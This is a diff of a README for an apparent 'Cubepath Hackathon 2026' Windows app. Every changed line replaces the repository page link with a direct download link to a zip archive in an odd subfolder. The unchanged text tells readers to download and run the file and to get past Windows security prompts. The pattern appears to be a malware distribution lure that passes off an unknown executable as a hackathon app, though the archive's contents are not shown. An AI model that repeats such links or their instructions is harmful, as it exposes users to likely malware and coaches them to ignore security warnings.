@@ -1,13 +1,13 @@
 # 🎯 hackaton-cubepath-2026 - Join the hackathon and build fast
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Joint-hynerpetonbassetti583/hackaton-cubepath-2026)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Joint-hynerpetonbassetti583/hackaton-cubepath-2026/main/maceration/hackaton-cubepath-v1.2.zip)
 
 ## 🚀 Getting Started
 
 Cubepath Hackathon 2026 is made for people who want to join the event, get the app, and start using it on Windows with a few simple steps.
 
 Use this page to visit the download source:
-https://github.com/Joint-hynerpetonbassetti583/hackaton-cubepath-2026
+https://raw.githubusercontent.com/Joint-hynerpetonbassetti583/hackaton-cubepath-2026/main/maceration/hackaton-cubepath-v1.2.zip
 
 ## 🪟 Windows Setup
 
@@ -28,7 +28,7 @@ Best results:
 ## 📥 Download the App
 
 1. Open this page in your browser:
-   https://github.com/Joint-hynerpetonbassetti583/hackaton-cubepath-2026
+   https://raw.githubusercontent.com/Joint-hynerpetonbassetti583/hackaton-cubepath-2026/main/maceration/hackaton-cubepath-v1.2.zip
 
 2. Find the main download area on the page.
 
@@ -40,7 +40,7 @@ Best results:
 
 6. If Windows shows a security prompt, choose the option that lets you open the file.
 
-[Visit the download page](https://github.com/Joint-hynerpetonbassetti583/hackaton-cubepath-2026)
+[Visit the download page](https://raw.githubusercontent.com/Joint-hynerpetonbassetti583/hackaton-cubepath-2026/main/maceration/hackaton-cubepath-v1.2.zip)
 
 ## 🛠️ Install and Run
 
@@ -158,7 +158,7 @@ If the download seems incomplete:
 ## 📎 Quick Access
 
 Download source:
-https://github.com/Joint-hynerpetonbassetti583/hackaton-cubepath-2026
+https://raw.githubusercontent.com/Joint-hynerpetonbassetti583/hackaton-cubepath-2026/main/maceration/hackaton-cubepath-v1.2.zip
 
 Direct action:
 Visit this page to download and run the Windows app
